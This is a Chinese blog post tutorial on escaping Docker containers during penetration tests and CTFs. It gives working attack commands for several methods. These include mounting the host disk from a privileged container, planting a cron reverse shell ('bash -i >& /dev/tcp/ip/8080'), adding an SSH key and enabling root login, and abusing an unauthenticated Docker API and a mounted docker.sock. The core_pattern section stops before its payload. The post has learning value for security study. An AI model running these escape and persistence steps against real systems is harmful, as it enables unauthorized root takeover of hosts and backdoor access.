<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>demo | Starven's Blog</title><meta name="author" content="Starven"><meta name="copyright" content="Starven"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="有时候无论是实战中还是在CTF中，在我们打进机器之后，发现在docker里面，这时候我们当然想逃逸到真实宿主机，所以就要用到docker逃逸 一、判断当前shell是否处于docker环境总的来说，是基于文件和磁盘和进程来检查的（ip172.17段也多是docker） 方法一：根目录是否存在.dockerenv 1ls &#x2F; -alh   方法二：查看系统进程是否有docker 12cat &#x2F;pro">
<meta property="og:type" content="article">
<meta property="og:title" content="demo">
<meta property="og:url" content="https://starven-l.github.io/2025/06/19/demo/index.html">
<meta property="og:site_name" content="Starven&#39;s Blog">
<meta property="og:description" content="有时候无论是实战中还是在CTF中，在我们打进机器之后，发现在docker里面，这时候我们当然想逃逸到真实宿主机，所以就要用到docker逃逸 一、判断当前shell是否处于docker环境总的来说，是基于文件和磁盘和进程来检查的（ip172.17段也多是docker） 方法一：根目录是否存在.dockerenv 1ls &#x2F; -alh   方法二：查看系统进程是否有docker 12cat &#x2F;pro">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://starven-l.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2025-06-18T16:49:25.000Z">
<meta property="article:modified_time" content="2025-06-18T17:06:00.074Z">
<meta property="article:author" content="Starven">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://starven-l.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "demo",
  "url": "https://starven-l.github.io/2025/06/19/demo/",
  "image": "https://starven-l.github.io/img/butterfly-icon.png",
  "datePublished": "2025-06-18T16:49:25.000Z",
  "dateModified": "2025-06-18T17:06:00.074Z",
  "author": [
    {
      "@type": "Person",
      "name": "Starven",
      "url": "https://starven-l.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://starven-l.github.io/2025/06/19/demo/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'demo',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Starven's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">demo</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">demo</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-18T16:49:25.000Z" title="发表于 2025-06-19 00:49:25">2025-06-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-18T17:06:00.074Z" title="更新于 2025-06-19 01:06:00">2025-06-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>有时候无论是实战中还是在CTF中，在我们打进机器之后，发现在docker里面，这时候我们当然想逃逸到真实宿主机，所以就要用到docker逃逸</p>
<h1 id="一、判断当前shell是否处于docker环境"><a href="#一、判断当前shell是否处于docker环境" class="headerlink" title="一、判断当前shell是否处于docker环境"></a>一、判断当前shell是否处于docker环境</h1><p>总的来说，是基于文件和磁盘和进程来检查的（ip172.17段也多是docker）</p>
<p>方法一：根目录是否存在.dockerenv</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ls</span> <span class="string">/</span> <span class="string">-alh</span></span><br></pre></td></tr></table></figure>

<p><img src="attachment:ad4122de-b9dd-46de-a71d-2d5e5c80298d:image.png" alt="image.png"></p>
<p>方法二：查看系统进程是否有docker</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/proc/1/cgroup</span></span><br><span class="line"><span class="string">cat</span> <span class="string">/proc/self/cgroup</span></span><br></pre></td></tr></table></figure>

<p>方法三：检查是否存在container环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env $PATH</span><br><span class="line">env</span><br></pre></td></tr></table></figure>

<p>方法四：检测磁盘挂载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount | grep &quot;docker&quot;</span><br><span class="line">fdisk -l  //轻量级的 Docker 容器不自带</span><br><span class="line">ps -aux</span><br></pre></td></tr></table></figure>

<p><img src="attachment:91ced057-db08-492b-a12c-05b9ee5f9dfd:image.png" alt="image.png"></p>
<h1 id="二、逃逸方法"><a href="#二、逃逸方法" class="headerlink" title="二、逃逸方法"></a>二、逃逸方法</h1><h2 id="1-privileged-特权模式直接挂载目录"><a href="#1-privileged-特权模式直接挂载目录" class="headerlink" title="1.privileged 特权模式直接挂载目录"></a>1.<strong>privileged 特权模式直接挂载目录</strong></h2><p>首先判断是否是特权模式【特权模式的话，CapEff对应的值为<strong>0000003fffffffff】</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/proc/self/status</span> <span class="string">|</span> <span class="string">grep</span> <span class="string">CapEff</span></span><br></pre></td></tr></table></figure>

<p><img src="attachment:38aa2a9d-104a-48dd-9ad2-6509a07f9224:image.png" alt="image.png"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@VM-24-4-ubuntu:~#</span> <span class="string">capsh</span> <span class="string">--decode=00000000a80425fb</span></span><br><span class="line"><span class="number">0x00000000a80425fb</span><span class="string">=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span></span><br></pre></td></tr></table></figure>

<p>此时并非特权模式</p>
<hr>
<p>如果以特权模式启动</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-it</span> <span class="string">--rm</span> <span class="string">--privileged</span> <span class="string">ubuntu</span> <span class="string">/bin/bash</span></span><br></pre></td></tr></table></figure>

<p><img src="attachment:5462ae69-c946-4e8b-a9da-d7765c7b8d98:image.png" alt="image.png"></p>
<p>为啥是000001ffffffffff不是<strong>0000003fffffffff呢？</strong></p>
<hr>
<p>通过capsh命令可以查看这串十六进制对应的权限</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">capsh</span> <span class="string">--decode=0000001fffffffff</span></span><br><span class="line"><span class="string">capsh</span> <span class="string">--decode=**0000003fffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="string">root@VM-24-4-ubuntu:~#</span> <span class="string">capsh</span> <span class="string">--decode=0000001fffffffff</span></span><br><span class="line"><span class="number">0x0000001fffffffff</span><span class="string">=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,</span></span><br><span class="line"><span class="string">cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_ow</span></span><br><span class="line"><span class="string">ner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap</span></span><br><span class="line"><span class="string">_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_</span></span><br><span class="line"><span class="string">override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend</span></span><br><span class="line"><span class="string">root@VM-24-4-ubuntu:~#</span> <span class="string">capsh</span> <span class="string">--decode=0000003fffffffff</span></span><br><span class="line"><span class="number">0x0000003fffffffff</span><span class="string">=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,</span></span><br><span class="line"><span class="string">cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_ow</span></span><br><span class="line"><span class="string">ner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap</span></span><br><span class="line"><span class="string">_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac</span></span><br><span class="line"><span class="string">_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read**</span></span><br></pre></td></tr></table></figure>

<p>我发现差了<strong>cap_audit_read这个权限</strong></p>
<p><code>cap_audit_read</code> 是什么权限？</p>
<ul>
<li><strong><code>CAP_AUDIT_READ</code></strong> 是 Linux 能力集中的一个权限，允许进程 <strong>读取内核审计日志</strong>。</li>
<li>这个能力使进程可以访问审计子系统产生的日志，用于安全审计和事件追踪。</li>
<li>只有拥有此能力的进程才能查看审计缓冲区的内容，通常只有安全审计守护进程或系统管理员需要</li>
</ul>
<p>记录我在复现成功之前遇到的问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<p>应该挂载哪个磁盘分区？一般是最大的那一个，我这台vps有很多loop（可能是之前有个比赛挂了很多上去），但是最大的还是&#x2F;dev&#x2F;vad下的&#x2F;dev&#x2F;vda2</p>
<p><img src="attachment:96023b3a-5303-4d96-a98f-1c99182fe949:image.png" alt="image.png"></p>
<p><img src="attachment:2348bd19-ad1f-4b02-bd9c-131187722053:image.png" alt="image.png"></p>
<p>可以看到成功将宿主机磁盘挂载到了我们的&#x2F;pwned目录下</p>
<p>那么我们最终的目的是要逃逸，如何getshell宿主机呢？</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">添加定时任务反弹shell</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">设置ssh公钥</span></span><br></pre></td></tr></table></figure>

<p>其实都可以命令执行了拿下服务器ssh上去不是随随便便了</p>
<p><img src="attachment:76e57a27-7bec-462e-8253-ef010ceb00dd:image.png" alt="image.png"></p>
<h2 id="（1）添加定时任务反弹shell【注意坑点！】"><a href="#（1）添加定时任务反弹shell【注意坑点！】" class="headerlink" title="（1）添加定时任务反弹shell【注意坑点！】"></a>（1）添加定时任务反弹shell【注意坑点！】</h2><p>注意坑点：必须要判断操作系统类型</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/宿主机磁盘挂载的目录/etc/os-release</span></span><br></pre></td></tr></table></figure>

<p>宿主机系统为 Alpine Linux，则应该操作 <code>/etc/crontabs</code></p>
<p>宿主机系统如果就是Ubuntu Linux，则操作 <code>/var/spool/cron/root/cronttabs</code></p>
<p>。。。。具体的查具体的路径即可</p>
<p>在 &#x2F;var&#x2F;spool&#x2F;cron 目录下新建一个 root 用户的定时任务（如果&#x2F;var&#x2F;spool&#x2F;cron&#x2F;目录下存在crontabs目录，则在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下进行新建）【每分钟的第0秒执行一次】</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8080 0&gt;&amp;1&#x27;</span> <span class="string">&gt;&gt;</span> <span class="string">/pwned/var/spool/cron/root</span></span><br></pre></td></tr></table></figure>

<p><img src="attachment:8dd5e405-e135-4c3f-864a-f1ba789b77bb:image.png" alt="image.png"></p>
<h2 id="（2）写公钥"><a href="#（2）写公钥" class="headerlink" title="（2）写公钥"></a>（2）写公钥</h2><p>生成公钥私钥文件</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ssh-keygen</span> <span class="string">-t</span> <span class="string">rsa</span> <span class="string">-b</span> <span class="number">4096</span> <span class="string">-f</span> <span class="string">my_key</span> <span class="string">-N</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>因为此时已经挂载了宿主机的目录，可以直接将公钥文件内容写入到宿主机的 <code>/root/.ssh/authorized_keys</code> 文件中，并赋予对应权限</p>
<p>注意修改宿主机的 <code>/etc/ssh/sshd_config</code> 文件设置一下参数</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PubkeyAuthentication</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">PermitRootLogin</span> <span class="string">yesAuthorizedKeysFile</span> <span class="string">.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>

<p>设置好之后 即可通过私钥进行连接，获取宿主机 root 权限，逃逸成功。</p>
<h2 id="2-docker-api未授权导致的逃逸漏洞"><a href="#2-docker-api未授权导致的逃逸漏洞" class="headerlink" title="2.docker api未授权导致的逃逸漏洞"></a>2.docker api未授权导致的逃逸漏洞</h2><p>Docker Remote API是一个取代远程命令行界面(RCLI)的REST API，当该接口直接暴漏在外网环境中且未作权限检查时，可以直接通过恶意调用相关的API进行远程命令执行 实现逃逸</p>
<h2 id="（1）判断漏洞是否存在-2375端口"><a href="#（1）判断漏洞是否存在-2375端口" class="headerlink" title="（1）判断漏洞是否存在-2375端口"></a>（1）判断漏洞是否存在-2375端口</h2><p>可以通过访问 ip:port 形式去查看是否存在漏洞，port一般为2375</p>
<p>返回{“message”:”page not found”}代表存在漏洞</p>
<p>使用 &#x2F;version、&#x2F;info 接口可以查看其他信息</p>
<h2 id="（2）常用命令操作靶机"><a href="#（2）常用命令操作靶机" class="headerlink" title="（2）常用命令操作靶机"></a>（2）常用命令操作靶机</h2><p>通过docker命令对目标靶机进行一些docker 命令操作</p>
<ul>
<li>查看目标上面启动的docker镜像</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">-H</span> <span class="string">tcp://ip:2375</span> <span class="string">ps</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个 alpine:latest 镜像（轻量级），并在启动时设置参数，将宿主机的目录挂载到 镜像中的 &#x2F;tmp 目录中</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">-H</span> <span class="string">tcp://ip:2375</span> <span class="string">run</span> <span class="string">-id</span> <span class="string">-v</span> <span class="string">/:/tmp</span> <span class="string">alpine:latest</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看容器 id，进入容器内</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">-H</span> <span class="string">tcp://ip:2375</span> <span class="string">ps</span></span><br><span class="line"><span class="string">docker</span> <span class="string">-H</span> <span class="string">tcp://ip:2375</span> <span class="string">exec</span> <span class="string">-it</span> <span class="string">8f9b946b36ec</span> <span class="string">sh</span></span><br></pre></td></tr></table></figure>

<h2 id="3-Docker-Socket逃逸"><a href="#3-Docker-Socket逃逸" class="headerlink" title="3.Docker Socket逃逸"></a>3.Docker Socket逃逸</h2><p>【问题记录】</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">宿主机创建的docker容器是传递了docker</span> <span class="string">socket守护进程的，命令如下</span></span><br><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-itd</span> <span class="string">-v</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span> <span class="string">--name</span> <span class="string">my_ubuntu</span> <span class="string">ubuntu:18.04</span></span><br><span class="line"></span><br><span class="line"><span class="string">当我进入容器里面再新建一个docker容器的时候</span></span><br><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-it</span> <span class="string">-v</span> <span class="string">/:/tmp</span> <span class="string">ubuntu</span> <span class="string">/bin/bash</span></span><br><span class="line"><span class="string">发现进入容器的容器的时候/tmp下居然是最开始宿主机的根目录，而不是宿主机创建的容器？</span></span><br><span class="line"><span class="string">为什么我在容器里面执行docker</span> <span class="string">run</span> <span class="string">-it</span> <span class="string">-v</span> <span class="string">/:/tmp</span> <span class="string">ubuntu</span> <span class="string">/bin/bash挂载的居然是宿主机？</span></span><br><span class="line"></span><br><span class="line"><span class="string">ChatGPT回答：容器中运行</span> <span class="string">Docker</span> <span class="string">命令实际是调用宿主机的</span> <span class="string">Docker</span> <span class="string">守护进程【其实也能很好的解释这个的漏洞成因】</span></span><br></pre></td></tr></table></figure>

<p>进入正题：</p>
<p>Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信，实现执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。</p>
<p>也就是说如果这个文件被挂载了之后，就可以直接操作宿主机的docker服务，进行创建、修改、删除镜像，从而实现逃逸</p>
<p>搭个环境</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-itd</span> <span class="string">-v</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span> <span class="string">--name</span> <span class="string">my_ubuntu</span> <span class="string">ubuntu:18.04</span></span><br></pre></td></tr></table></figure>

<p>判断是否存在</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ls</span> <span class="string">-lah</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line"><span class="string">find</span> <span class="string">/</span> <span class="string">-name</span> <span class="string">docker.sock</span> <span class="string">【注意有时候存在软链接目录看似不一致但其实是一个，可以用ls</span> <span class="string">-ld判断】</span></span><br></pre></td></tr></table></figure>

<p><img src="attachment:ecd7383d-ec4c-48df-b5a9-57390ff9a924:image.png" alt="image.png"></p>
<h2 id="（1）新建容器挂载宿主机目录"><a href="#（1）新建容器挂载宿主机目录" class="headerlink" title="（1）新建容器挂载宿主机目录"></a>（1）新建容器挂载宿主机目录</h2><p>首先在容器里面下载docker容器</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">apt-get</span> <span class="string">update</span>  </span><br><span class="line"><span class="string">apt-get</span> <span class="string">install</span> <span class="string">curl</span>  </span><br><span class="line"><span class="string">apt-get</span> <span class="string">install</span> <span class="string">docker.io</span> <span class="string">-y</span></span><br></pre></td></tr></table></figure>

<p>然后在容器里面再新建容器，并在启动时挂载宿主机（这里指的是目前的这个容器）根目录</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-it</span> <span class="string">-v</span> <span class="string">/:/tmp</span> <span class="string">ubuntu</span> <span class="string">/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>命令执行完毕之后，docker的容器 id 发生变化，证明已经直接进入了刚创建的新的容器里面查看 &#x2F;tmp 目录，宿主机根目录已经成功挂载</p>
<p><img src="attachment:e3405f65-6d4b-489f-b5ea-7548579615ed:image.png" alt="image.png"></p>
<p>因为是直接操作的宿主机的 docker 服务，所以在宿主机进行查看，会发现多了个 docker 镜像，正是docker 容器里面创建的那个。（我这里创建的是临时容器，exit之后就会销毁）</p>
<p><img src="attachment:17d295e6-1990-4776-8fd5-c454b1f38b8e:image.png" alt="image.png"></p>
<p>在新创建的容器里面 使用 chroot 命令 更改当前进程的根目录 为挂载宿主机文件的 &#x2F;tmp 目录</p>
<p><img src="attachment:dc7bba73-d97a-4578-af5f-d76af60cad0a:image.png" alt="image.png"></p>
<h2 id="4-Proc危险挂载导致的docker逃逸漏洞"><a href="#4-Proc危险挂载导致的docker逃逸漏洞" class="headerlink" title="4. Proc危险挂载导致的docker逃逸漏洞"></a>4. Proc危险挂载导致的docker逃逸漏洞</h2><p>【问题记录】</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">这种情况导致的逃逸，真实渗透中真会存在吗?什么时候会有需要挂载/proc/sys/kernel/core_pattern？感觉没情况会用到啊</span></span><br><span class="line"></span><br><span class="line"><span class="string">ChatGPT回答：</span></span><br><span class="line"><span class="string">极少数特殊调试场景下可能会这样做，比如：</span></span><br><span class="line"><span class="string">开发人员需要在容器内直接观察或修改宿主机的</span> <span class="string">core_pattern</span> <span class="string">配置，用于调试核心转储行为。</span></span><br><span class="line"><span class="string">容器化的监控或运维工具需要读取内核崩溃转储相关的配置，但正确做法是通过专门的接口或API，而不是直接挂载文件。</span></span><br><span class="line"></span><br><span class="line"><span class="string">现实中容器逃逸案例更常见的是挂载整个</span> <span class="string">/proc</span> <span class="string">或者关键内核设备文件，而不是单独挂载</span> <span class="string">core_pattern</span> <span class="string">文件。</span></span><br><span class="line"><span class="string">但如果误挂载</span> <span class="string">core_pattern</span> <span class="string">文件，则确实存在利用该机制逃逸的可能，风险较大。</span></span><br><span class="line"><span class="string">安全建议是尽量避免将宿主机的敏感内核配置文件挂载到容器内，尤其是</span> <span class="string">/proc/sys/kernel/core_pattern</span> <span class="string">这类直接影响内核行为的文件。</span></span><br></pre></td></tr></table></figure>

<p>linux中的<code>/proc</code>目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。如果 docker 启动时将 &#x2F;proc 目录挂载到了容器内部，就可以实现逃逸。</p>
<p>前置知识：</p>
<ul>
<li><code>/proc/sys/kernel/core_pattern</code>文件是负责 进程崩溃时 的内存数据转储，当第一个字符是管道符<code>|</code>时，后面的部分会以命令行的方式进行解析并运行。</li>
<li>并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。利用该解析方式，可以进行容器逃逸。</li>
</ul>
<p>创建容器：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-d</span> <span class="string">--name</span> <span class="string">ubuntu_test</span> <span class="string">-v</span> <span class="string">/proc/sys/kernel/core_pattern:/hacker2/proc/sys/kernel/core_pattern</span> <span class="string">ubuntu:18.04</span> <span class="string">tail</span> <span class="string">-f</span> <span class="string">/dev/null</span></span><br></pre></td></tr></table></figure>

<p>判断是否挂载了宿主机的 procfs：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">find</span> <span class="string">/</span> <span class="string">-name</span> <span class="string">core_pattern</span></span><br></pre></td></tr></table></figure>

<p><img src="attachment:2a0653b9-3700-4f1d-8292-d9b9beb415c5:image.png" alt="image.png"></p>
<p>确定当前容器在宿主机下的路径：</p>
<p><strong>workdir</strong> 是分层存储的工作目录</p>
<p>而<strong>merged</strong> 是挂载点（即容器的文件系统视图）</p>
<p>将路径中的 <code>work</code> 替换为 <code>merged</code> 就是当前容器在宿主机上面的绝对路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@e0a493278c7f: <span class="built_in">cat</span> /proc/mounts | xargs -d <span class="string">&#x27;,&#x27;</span> -n 1 | grep workdir</span><br><span class="line">workdir=/var/lib/docker/overlay2/df90fee56d5fe5a81effa5c2440cef4599787ece681174cd67f2d9ce60228f36/work 0 0</span><br></pre></td></tr></table></figure>

<p>因此绝对路径是 <code>/var/lib/docker/overlay2/df90fee56d5fe5a81effa5c2440cef4599787ece681174cd67f2d9ce60228f36/merged</code></p>
<p>宿主机访问该路径，确实存在hacker2目录，说明是对的</p>
<p><img src="attachment:dd1ea0f4-1e96-4ece-bafc-b801078629a6:image.png" alt="image.png"></p>
